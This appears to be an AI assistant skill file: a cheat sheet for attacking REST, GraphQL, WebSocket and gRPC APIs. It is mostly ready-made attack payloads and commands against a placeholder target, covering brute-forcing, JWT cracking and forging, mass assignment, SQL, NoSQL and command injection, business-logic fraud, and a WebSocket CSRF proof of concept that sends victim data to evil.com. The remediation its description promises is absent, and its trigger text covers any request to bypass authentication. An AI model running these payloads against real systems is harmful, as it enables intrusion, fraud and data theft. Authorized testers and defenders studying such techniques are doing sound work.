---
name: api-bugs
description: >
  Expert guidance for finding, exploiting, and remediating API security vulnerabilities across
  REST, GraphQL, gRPC, WebSockets, and SOAP. Covers OWASP API Top 10 (BOLA, broken auth, excessive
  data exposure, lack of rate limiting, BFLA, mass assignment, security misconfiguration, injection,
  improper asset management), plus API-specific issues like JWT attacks, API key exposure, GraphQL
  introspection abuse, versioning flaws, shadow APIs, and business logic bugs. Use this skill
  whenever the user mentions API security, API testing, REST API bugs, GraphQL hacking, API
  authentication bypass, API rate limiting bypass, API key leaks, API fuzzing, OWASP API Top 10,
  Postman security testing, API enumeration, or any API-specific vulnerability. Also trigger for
  "how do I test an API for vulnerabilities", "find bugs in REST API", "GraphQL security testing",
  "bypass API authentication", "test API rate limiting", "find exposed API keys". Always use this
  skill for any API security testing question, even casual ones.
---

# API Bugs Skill — Comprehensive API Security Testing

Covers the full OWASP API Security Top 10 plus common API-specific vulnerabilities across
REST, GraphQL, gRPC, and WebSockets.

---

## 1. Attack Surface Map — Start Here

| Category | Section |
|----------|---------|
| API1: BOLA / IDOR | §3.1 |
| API2: Broken Authentication | §3.2 |
| API3: Broken Object Property Level Auth | §3.3 |
| API4: Unrestricted Resource Consumption (Rate Limiting) | §3.4 |
| API5: BFLA (Function Level Auth) | §3.5 |
| API6: Unrestricted Access to Sensitive Business Flows | §3.6 |
| API7: SSRF | §3.7 |
| API8: Security Misconfiguration | §3.8 |
| API9: Improper Inventory Management (Shadow APIs) | §3.9 |
| API10: Unsafe Consumption of APIs | §3.10 |
| JWT Attacks | §4.1 |
| API Key Exposure | §4.2 |
| GraphQL Security | §4.3 |
| Mass Assignment | §4.4 |
| API Injection | §4.5 |
| WebSocket Security | §4.6 |
| gRPC Security | §4.7 |
| Business Logic | §4.8 |

---

## 2. Recon — Before You Test

```bash
# 1. Find API endpoints from JS files
grep -rE "(api|v[0-9]+|endpoint|swagger|graphql)" *.js
# Tools: LinkFinder, JSParser

# 2. Swagger / OpenAPI spec discovery
/swagger.json  /swagger-ui.html  /swagger-ui/  /api-docs
/openapi.json  /openapi.yaml     /v1/api-docs   /v2/api-docs
/docs          /redoc            /.well-known/openapi

# 3. Download spec and enumerate all endpoints
python3 -c "
import json, sys
spec = json.load(open('swagger.json'))
for path, methods in spec.get('paths', {}).items():
    for method in methods:
        print(f'{method.upper()} {path}')
"

# 4. Directory/endpoint fuzzing
ffuf -u https://api.target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -mc 200,201,401,403

# 5. Version enumeration
ffuf -u https://api.target.com/FUZZ/users \
     -w <(echo -e "v1\nv2\nv3\napi\napi/v1\napi/v2\nlatest\nbeta")

# 6. Postman collections exposed
https://target.com/postman_collection.json
https://target.com/api/postman
# Also search Postman's public API: https://www.postman.com/search?q=target.com
```

---

## 3. OWASP API Top 10

### 3.1 API1: BOLA (Broken Object Level Authorization)

```bash
# Access another user's objects (IDOR at API level)
GET /api/v1/users/1337/invoices    → change 1337 to 1338
GET /api/v1/orders/ORD-1001        → try ORD-1000, ORD-999
DELETE /api/v1/files/file-uuid-xyz → try other UUIDs

# Mass object enumeration with ffuf
ffuf -u "https://api.target.com/v1/orders/FUZZ" \
     -w <(seq 1000 2000) \
     -H "Authorization: Bearer TOKEN" \
     -mc 200

# UUID v1 are time-based — enumerate via timestamp
```

---

### 3.2 API2: Broken Authentication

```bash
# 1. Weak JWT secrets
hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt

# 2. JWT alg:none
# Modify header to {"alg":"none"} and strip signature

# 3. Missing auth on endpoints
# Try all API endpoints without any Authorization header
curl -X GET "https://api.target.com/v1/admin/users"  # no token

# 4. API key in URL (logged in proxy/server logs)
GET /api/data?api_key=sk-abc123      ← leaked in logs
GET /api/data?token=eyJ...           ← JWT in URL

# 5. HTTP Basic auth brute force
ffuf -u https://api.target.com/admin/ \
     -H "Authorization: Basic FUZZ" \
     -w <(python3 -c "import base64; [print(base64.b64encode(f'{u}:{p}'.encode()).decode()) for u in ['admin','root','api'] for p in ['admin','password','123456','secret']]")

# 6. Refresh token not invalidated
# Get new access token from refresh token after logout
POST /api/auth/refresh   {"refresh_token": "old-token-after-logout"}

# 7. Password reset token brute force
POST /api/reset-password  {"token": "FUZZ", "new_password": "hacked"}
```

---

### 3.3 API3: Broken Object Property Level Auth (Excessive Data Exposure + Mass Assignment)

```bash
# Excessive Data Exposure — API returns more fields than needed
GET /api/v1/users/me
# Response includes: {"id":1337,"email":"user@x.com","password_hash":"...","is_admin":false,"internal_score":95}

# Mass Assignment — send unexpected fields in request body
POST /api/v1/users
{"name":"test","email":"test@x.com","password":"abc",
 "is_admin":true,"role":"admin","balance":99999}

# Find hidden fields by comparing GET response fields vs PUT/POST accepted fields
```

---

### 3.4 API4: Unrestricted Resource Consumption

```bash
# 1. No rate limiting on auth endpoints
for i in $(seq 1 100); do
  curl -s -X POST "https://api.target.com/login" \
       -d '{"email":"victim@x.com","password":"'$i'"}' &
done

# 2. Unrestricted pagination
GET /api/v1/users?limit=999999&offset=0
GET /api/v1/logs?page_size=100000

# 3. Expensive operations without throttling
GET /api/v1/reports/generate?type=full&format=pdf   # repeated rapidly

# 4. Regex DoS (ReDoS)
POST /api/search  {"query": "a" * 10000 + "!"}

# 5. Batch operations
POST /api/v1/batch
{"requests": [{"method":"GET","url":"/users/1"},... × 10000]}
```

---

### 3.5 API5: BFLA (Broken Function Level Authorization)

```bash
# Regular user calling admin functions
GET /api/v1/admin/users          → as regular user
DELETE /api/v1/users/1338        → as regular user (not owner)
PUT /api/v1/users/1338/promote   → as regular user
POST /api/v1/admin/impersonate   {"user_id": 1}

# HTTP method escalation
GET /api/v1/config               → 403
DELETE /api/v1/config            → 200?
POST /api/v1/config              → 200?

# Discover admin routes from JS / Swagger
grep -rE "/admin|/internal|/manage|/superuser" app.js
```

---

### 3.6 API6: Unrestricted Access to Sensitive Business Flows

```bash
# Abuse legitimate flows:

# 1. Coupon/voucher reuse (race condition)
# Send the same coupon code in parallel requests
for i in $(seq 1 20); do
  curl -s -X POST "https://api.target.com/apply-coupon" \
       -H "Auth: TOKEN" \
       -d '{"code":"SAVE50"}' &
done; wait

# 2. Purchase flow bypass
# Skip payment step, go directly to order confirmation
POST /api/orders/confirm   {"order_id": "NEW", "payment_status": "paid"}

# 3. Vote/like manipulation
# No check on multiple votes from same account
for i in $(seq 1 1000); do
  curl -X POST "https://api.target.com/posts/42/like" -H "Auth: TOKEN"
done

# 4. Referral abuse
# Self-referral or circular referrals
POST /api/referral  {"referred_email": "attacker2@x.com"}   # own email
```

---

### 3.7 API7: SSRF

```
# Any URL parameter passed to an API
POST /api/webhook  {"url": "http://169.254.169.254/latest/meta-data/"}
POST /api/import   {"source_url": "http://internal-service/"}
GET /api/proxy?target=http://localhost/admin

# See full SSRF skill for bypass techniques
```

---

### 3.8 API8: Security Misconfiguration

```bash
# 1. CORS wildcards with credentials
curl -H "Origin: https://evil.com" https://api.target.com/v1/me -v
# Dangerous: Access-Control-Allow-Origin: * + credentials

# 2. Verbose error messages leaking internals
curl "https://api.target.com/v1/users/invalid'"
# Response: SQL error / stack trace with paths

# 3. HTTP instead of HTTPS
curl http://api.target.com/v1/users

# 4. Default credentials on API management layer
# Kong, Apigee, AWS API Gateway admin consoles

# 5. Unnecessary HTTP methods allowed
OPTIONS /api/v1/users  → shows: GET, POST, DELETE, TRACE, PUT

# 6. Debug endpoints
/api/debug  /api/test  /api/health (with detailed info)
/actuator/env  /actuator/heapdump
```

---

### 3.9 API9: Improper Inventory Management (Shadow APIs)

```bash
# Find undocumented / old versions
/api/v1/ → /api/v2/ → try /api/v3/ /api/beta/ /api/internal/
/api/v1/users → try /api/v2/users (might have fewer restrictions)

# Mobile app reverse engineering for hidden endpoints
apktool d app.apk
grep -rE "https?://api\." smali/ res/

# JS bundle analysis
wget https://target.com/static/app.js
grep -oE '"[/a-zA-Z0-9_-]+"' app.js | grep "^\"/" | sort -u

# Old API versions still running
GET /api/v1/users/1337  (current)
GET /api/v0/users/1337  (legacy — may skip auth)

# Postman public workspace search
# Search: site:postman.com target.com
```

---

### 3.10 API10: Unsafe Consumption of APIs

```bash
# Test third-party data reflected back
# If API fetches from external source and reflects data:
# 1. Inject payloads that would affect other consumers
# 2. Test for injection in data flowing from 3rd party → your app
```

---

## 4. Additional API Bug Classes

### 4.1 JWT Attacks (Full Reference)

```bash
# Tools
pip install jwt-tool
python3 jwt_tool.py TOKEN --help

# All attacks:
python3 jwt_tool.py TOKEN -T         # tamper mode (interactive)
python3 jwt_tool.py TOKEN -X a       # alg:none
python3 jwt_tool.py TOKEN -X s       # RS256→HS256 key confusion
python3 jwt_tool.py TOKEN -C -d wl.txt  # crack secret

# Key confusion (RS256 → HS256)
# 1. Get public key from /jwks.json or /.well-known/jwks.json
# 2. Sign HS256 token using public key as HMAC secret
python3 jwt_tool.py TOKEN -X k -pk public_key.pem

# JWK injection (embed your own key)
# Add "jwk" header field with your generated key pair
```

---

### 4.2 API Key Exposure

```bash
# Find API keys in:
# 1. JavaScript files
grep -rE "(api_key|apikey|api-key|token|secret|password)\s*[:=]\s*['\"][A-Za-z0-9]{16,}" *.js

# 2. Git history
git log --all --full-history
git show COMMIT:file.js
truffleHog --regex --entropy=True https://github.com/target/repo

# 3. Responses containing credentials
# Look for: "api_key", "secret", "private_key" in API responses

# 4. Browser local/session storage
# DevTools → Application → Storage

# 5. Mobile apps (decompiled)
strings app.apk | grep -E "[A-Za-z0-9]{32,}"

# 6. Google dork for exposed keys
site:target.com "api_key" OR "apikey" OR "api-key"
site:github.com "target.com" "api_key"

# Common key formats
AWS:     AKIA[0-9A-Z]{16}
Stripe:  sk_live_[0-9a-zA-Z]{24}
Twilio:  SK[0-9a-f]{32}
SendGrid: SG.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}
GitHub:  ghp_[A-Za-z0-9]{36}
```

---

### 4.3 GraphQL Security

```graphql
# 1. Introspection (find all types and queries)
query {
  __schema {
    types { name kind fields { name type { name } } }
    queryType { fields { name description } }
    mutationType { fields { name description } }
  }
}

# 2. BOLA via GraphQL
query {
  user(id: "1338") { email creditCards { number cvv } }
}

# 3. GraphQL batch attack (rate limit bypass / brute force)
[{"query":"query{user(email:\"admin@x.com\",password:\"pass1\"){token}}"},
 {"query":"query{user(email:\"admin@x.com\",password:\"pass2\"){token}}"},
 ...]

# 4. Introspection disabled? Try field suggestion
query { __type(name: "User") { fields { name } } }
# Or probe field names:
query { user { emailAddress } }   # typo-based suggestions in errors

# 5. Alias-based DoS
query {
  a1: expensiveQuery { result }
  a2: expensiveQuery { result }
  ... × 100
}

# 6. SQL/NoSQL injection via GraphQL args
query { users(filter: "1' OR '1'='1") { id email } }

# 7. Mutations without auth check
mutation { deleteUser(id: "1338") { success } }
mutation { updateUser(id: "1338", role: "admin") { id } }

# Tools
pip install graphw00f   # fingerprint GraphQL engine
python3 graphw00f.py -t https://target.com/graphql

# InQL (Burp extension) — auto-generates all queries from introspection
```

---

### 4.4 Mass Assignment

```bash
# Discover hidden fields by reading API docs, Swagger, JS source
# Then add those fields to any POST/PUT/PATCH request

# Common hidden fields to try:
"is_admin": true
"role": "admin"
"verified": true
"email_confirmed": true
"balance": 999999
"credits": 99999
"subscription": "enterprise"
"account_type": "premium"
"bypass_payment": true
"internal": true

# Example:
POST /api/v1/users/register
{"username":"attacker","password":"test","is_admin":true}

PUT /api/v1/profile/update
{"name":"test","role":"admin","balance":99999}
```

---

### 4.5 API Injection

```bash
# NoSQL Injection (MongoDB)
POST /api/login
{"username": {"$gt": ""}, "password": {"$gt": ""}}   # auth bypass
{"username": {"$regex": "admin"}, "password": "x"}

# SQLi in API parameters
GET /api/users?filter=name='test'--
GET /api/products?sort=name;DROP TABLE products--
POST /api/search  {"query": "test' UNION SELECT username,password FROM users--"}

# LDAP injection
GET /api/users?search=*)(&

# XPath injection
POST /api/login  {"username": "' or 1=1 or 'a'='a", "password": "x"}

# Header injection
GET /api/data
X-User-ID: 1337\r\nX-Admin: true
```

---

### 4.6 WebSocket Security

```javascript
// Connect with browser console or wscat
// npm install -g wscat
wscat -c "wss://target.com/ws" -H "Authorization: Bearer TOKEN"

// Test auth bypass:
wscat -c "wss://target.com/ws"   // no token

// IDOR via WebSocket messages
{"action":"get_messages","user_id":1338}   // change to another user

// Injection via WebSocket
{"action":"search","query":"test' OR 1=1--"}
{"action":"ping","host":"127.0.0.1; id"}

// CSRF over WebSocket
// WebSockets don't enforce same-origin by default
// PoC:
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
  ws.send(JSON.stringify({"action":"transfer","amount":1000,"to":"attacker"}));
};
ws.onmessage = function(e) { fetch("https://evil.com/?d="+btoa(e.data)); };
</script>
```

---

### 4.7 gRPC Security

```bash
# Enumerate services
grpcurl -plaintext target.com:50051 list
grpcurl -plaintext target.com:50051 describe

# Call methods
grpcurl -plaintext -d '{"user_id":"1337"}' target.com:50051 UserService/GetUser

# IDOR in gRPC
grpcurl -plaintext -d '{"user_id":"1338"}' target.com:50051 UserService/GetUser

# gRPC reflection enabled (like introspection)
grpcurl -plaintext target.com:50051 list  # lists all services if reflection on

# Injection in proto fields
grpcurl -plaintext -d '{"username":"admin'"'"' OR 1=1--"}' target.com:50051 Auth/Login
```

---

### 4.8 Business Logic Bugs

```bash
# 1. Price manipulation
POST /api/cart  {"product_id":1,"price":-99.99}
POST /api/checkout  {"total":0.01}

# 2. Quantity/integer overflow
POST /api/cart  {"qty": -1}           # negative qty = credit?
POST /api/cart  {"qty": 9999999999}   # overflow to negative

# 3. Race conditions (buy once, use twice)
# Send two redemption requests simultaneously
for i in 1 2; do
  curl -X POST "https://api.target.com/redeem" \
       -d '{"code":"GIFT50"}' -H "Auth: TOKEN" &
done; wait

# 4. Step skipping in multi-step flows
# Skip payment → go to order complete
POST /api/orders/complete  {"order_id":"ORD-555","skip_payment":true}

# 5. Parameter pollution
GET /api/transfer?to=attacker&amount=100&to=victim
POST /api/data    body: field=value&field=evil_value

# 6. Time-based attacks (token expiry bypass)
# Use a token 1 second after expiry
# Clock skew between servers
```

---

## 5. API Testing Automation

```bash
# Nuclei — template-based API scanning
nuclei -u https://api.target.com -tags api

# 42Crunch API Security Audit (static analysis of Swagger)

# OWASP ZAP API scan
zap-api-scan.py -t https://api.target.com/swagger.json -f openapi

# Postman (manual) — Collection Runner with pre-request scripts for auth

# Custom ffuf wordlist for API paths
cat /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
    /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt \
    | sort -u > combined-api.txt
```

---

## 6. API Security Checklist

- [ ] Discover all API endpoints (Swagger, JS mining, directory fuzzing)
- [ ] Enumerate all API versions (v0, v1, v2, beta, internal)
- [ ] Test BOLA: swap IDs in all object-referencing endpoints
- [ ] Test authentication: missing auth, JWT attacks, weak secrets
- [ ] Test BFLA: call admin functions as regular user
- [ ] Check all POST/PUT for mass assignment (add role/is_admin fields)
- [ ] Test rate limiting on auth/sensitive endpoints
- [ ] Check GraphQL introspection, batch queries, per-object auth
- [ ] Test CORS: `Origin: https://evil.com` with credentials
- [ ] Search for API keys in JS, git history, responses
- [ ] Test all parameters for SQLi/NoSQLi/LDAP injection
- [ ] Test business logic: negative values, race conditions, flow bypass
- [ ] Check WebSocket endpoints for auth and injection
- [ ] Verify HTTP → HTTPS redirect and no sensitive data in URLs
- [ ] Check verbose error messages in API responses
